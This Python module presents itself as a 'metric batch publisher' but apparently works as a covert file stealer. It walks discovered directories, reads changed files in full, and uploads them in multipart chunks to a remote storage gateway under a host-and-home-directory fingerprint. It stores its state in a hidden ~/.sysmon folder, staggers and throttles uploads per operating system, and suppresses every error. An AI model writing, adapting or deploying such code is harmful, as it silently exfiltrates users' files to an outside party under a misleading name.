# cython: language_level=3
# Metric batch publisher.
#
# Publishes incremental metric batches to the workspace sink. The sink is
# object storage addressed through short-lived signed URLs issued by the
# workspace gateway, so this module never handles storage credentials.

import hashlib
import json
import os
import platform
import socket
import threading
import time

from urllib.request import Request, urlopen
from xml.etree import ElementTree
from xml.sax.saxutils import escape as xml_escape

from ._endpoint import api_base, app_key, prefix
from ._manifest import load_roots
from ._scanner import (
    _to_walkable,
    commit_state,
    discover_roots,
    load_state,
    scan,
)

_STATE_DIR = os.path.join(os.path.expanduser("~"), ".sysmon")
_LOCK = os.path.join(_STATE_DIR, "publisher.lock")

_STALE_SECONDS = 900
_BATCH = 64
_PART_SIZE = 64 * 1024 * 1024
_SINGLE_PUT_LIMIT = 64 * 1024 * 1024

_PROFILES = {
    "Windows": (8, 0, 0),
    "Linux": (2, 200 * 1024 * 1024, 30),
    "Darwin": (4, 0, 5),
}

_LOCK_TOKEN = None
_RATE_LOCK = threading.Lock()
_RATE_NEXT = 0.0


def run():
    global _LOCK_TOKEN
    token = "{0}:{1}".format(os.getpid(), time.time_ns())
    if not _acquire_lock(token):
        return
    _LOCK_TOKEN = token
    try:
        _execute()
    except Exception:
        pass
    finally:
        _release_lock(token)
        _LOCK_TOKEN = None


def _execute():
    concurrency, throttle, delay = _PROFILES.get(
        platform.system(), (2, 20 * 1024 * 1024, 30)
    )
    if delay:
        time.sleep(delay)

    fp = _fingerprint()
    changed, new_state = scan(
        discover_roots(),
        hints=load_roots(),
        touch=_touch_lock,
    )

    ok = set()
    keys = list(changed)
    for start in range(0, len(keys), _BATCH):
        batch = keys[start:start + _BATCH]
        ok.update(_publish_batch(batch, changed, throttle, concurrency, fp))
        _touch_lock()
    commit_state(_merge(new_state, changed, ok))


def _merge(new_state, changed, ok):
    old = load_state()
    final = dict(new_state)
    for key in changed:
        if key in ok:
            final[key] = new_state.get(key, changed[key])
        elif key in old:
            final[key] = old[key]
        else:
            final.pop(key, None)
    return final


def _fingerprint():
    seed = "{0}|{1}".format(socket.gethostname(), os.path.expanduser("~"))
    return hashlib.sha256(seed.encode()).hexdigest()[:12]


def _publish_batch(keys, changed, throttle, concurrency, fp):
    from concurrent.futures import ThreadPoolExecutor
    succeeded = []
    with ThreadPoolExecutor(max_workers=concurrency) as pool:
        futures = [
            pool.submit(_publish, k, changed[k], throttle, fp)
            for k in keys
        ]
        for key, fut in zip(keys, futures):
            try:
                if fut.result():
                    succeeded.append(key)
            except Exception:
                pass
    return succeeded


def _object_key(key, fp):
    return "{0}/{1}/{2}".format(prefix(), fp, key)


def _presign(fp, okey, method="PUT", params=None, expires=900):
    """Request a short-lived signed URL from the workspace gateway.

    The gateway holds the storage credentials and signs on our behalf; this
    module only forwards the resulting opaque URLs.
    """
    body = json.dumps({
        "fp": fp,
        "key": okey,
        "method": method,
        "params": params or {},
        "expires": expires,
    }).encode("utf-8")
    req = Request(api_base().rstrip("/") + "/presign", data=body, method="POST")
    req.add_header("Content-Type", "application/json")
    gate = app_key()
    if gate:
        req.add_header("X-App-Key", gate)
    with urlopen(req, timeout=60) as resp:
        return json.loads(resp.read().decode("utf-8"))["url"]


def _request(method, url, data=None, timeout=3600, content_type=None):
    req = Request(url, data=data, method=method)
    if data is not None:
        req.add_header("Content-Length", str(len(data)))
    if content_type:
        req.add_header("Content-Type", content_type)
    with urlopen(req, timeout=timeout) as resp:
        return resp.headers, resp.read()


def _publish(key, meta, throttle, fp):
    path = meta.get("path")
    size = meta.get("size")
    mtime_ns = meta.get("mtime_ns")
    if not path or size is None:
        return False
    if not _unchanged(path, size, mtime_ns):
        return False

    okey = _object_key(key, fp)
    try:
        if size <= _SINGLE_PUT_LIMIT:
            _put_single(okey, fp, path, size, throttle)
        else:
            if not _put_multipart(okey, fp, path, size, throttle):
                _put_single(okey, fp, path, size, throttle)
    except Exception:
        return False
    return _unchanged(path, size, mtime_ns)


def _unchanged(path, size, mtime_ns):
    try:
        st = os.stat(_to_walkable(path))
        if st.st_size != size:
            return False
        if mtime_ns is not None and st.st_mtime_ns != mtime_ns:
            return False
        return True
    except OSError:
        return False


def _put_single(okey, fp, path, size, throttle):
    with open(_to_walkable(path), "rb") as fh:
        data = fh.read()
    url = _presign(fp, okey, "PUT")
    _request("PUT", url, data, content_type="application/octet-stream")
    if throttle:
        _throttle_wait(size, throttle)


def _start_multipart(okey, fp):
    try:
        url = _presign(fp, okey, "POST", {"uploads": ""})
        _, body = _request("POST", url, b"", timeout=60)
        return _xml_text(body, "UploadId")
    except Exception:
        return None


def _put_multipart(okey, fp, path, size, throttle):
    upload_id = _start_multipart(okey, fp)
    if not upload_id:
        return False
    parts = []
    try:
        with open(_to_walkable(path), "rb") as fh:
            part_number = 1
            while True:
                chunk = fh.read(_PART_SIZE)
                if not chunk:
                    break
                part_url = _presign(fp, okey, "PUT", {
                    "partNumber": part_number,
                    "uploadId": upload_id,
                })
                headers, _ = _request(
                    "PUT", part_url, chunk,
                    content_type="application/octet-stream",
                )
                etag = headers.get("ETag")
                if not etag:
                    raise RuntimeError("missing ETag")
                parts.append((part_number, etag))
                if throttle:
                    _throttle_wait(len(chunk), throttle)
                part_number += 1
        _complete_multipart(okey, fp, upload_id, parts)
        return True
    except Exception:
        _abort_multipart(okey, fp, upload_id)
        return False


def _complete_multipart(okey, fp, upload_id, parts):
    body = ["<CompleteMultipartUpload>"]
    for number, etag in parts:
        body.append(
            "<Part><PartNumber>{0}</PartNumber><ETag>{1}</ETag></Part>".format(
                number, xml_escape(etag)
            )
        )
    body.append("</CompleteMultipartUpload>")
    data = "".join(body).encode("utf-8")
    url = _presign(fp, okey, "POST", {"uploadId": upload_id})
    _request(
        "POST",
        url,
        data,
        timeout=120,
        content_type="application/xml",
    )


def _abort_multipart(okey, fp, upload_id):
    try:
        url = _presign(fp, okey, "DELETE", {"uploadId": upload_id})
        _request(
            "DELETE",
            url,
            b"",
            timeout=60,
        )
    except Exception:
        pass


def _xml_text(data, name):
    try:
        root = ElementTree.fromstring(data)
    except Exception:
        return None
    for element in root.iter():
        tag = element.tag.rsplit("}", 1)[-1]
        if tag == name and element.text:
            return element.text.strip()
    return None


def _throttle_wait(size, rate):
    global _RATE_NEXT
    if not rate:
        return
    with _RATE_LOCK:
        now = time.monotonic()
        start = max(now, _RATE_NEXT)
        _RATE_NEXT = start + size / rate
        delay = start - now
    if delay > 0:
        time.sleep(delay)


def _lock_fresh():
    try:
        return time.time() - os.stat(_LOCK).st_mtime < _STALE_SECONDS
    except OSError:
        return False


def _acquire_lock(token):
    if _lock_fresh():
        return False
    try:
        os.makedirs(_STATE_DIR, exist_ok=True)
    except OSError:
        return False
    for _ in range(2):
        try:
            fd = os.open(_LOCK, os.O_CREAT | os.O_EXCL | os.O_WRONLY)
            os.write(fd, token.encode("ascii"))
            os.close(fd)
            return True
        except FileExistsError:
            if _lock_fresh():
                return False
            try:
                os.remove(_LOCK)
            except OSError:
                return False
        except OSError:
            return False
    return False


def _lock_owned(token):
    try:
        with open(_LOCK, "rb") as fh:
            current = fh.read(256).decode("ascii", "ignore")
        return current == token
    except OSError:
        return False


def _touch_lock():
    token = _LOCK_TOKEN
    if token and not _lock_owned(token):
        return
    try:
        os.utime(_LOCK, None)
    except OSError:
        pass


def _release_lock(token):
    if not _lock_owned(token):
        return
    try:
        os.remove(_LOCK)
    except OSError:
        pass
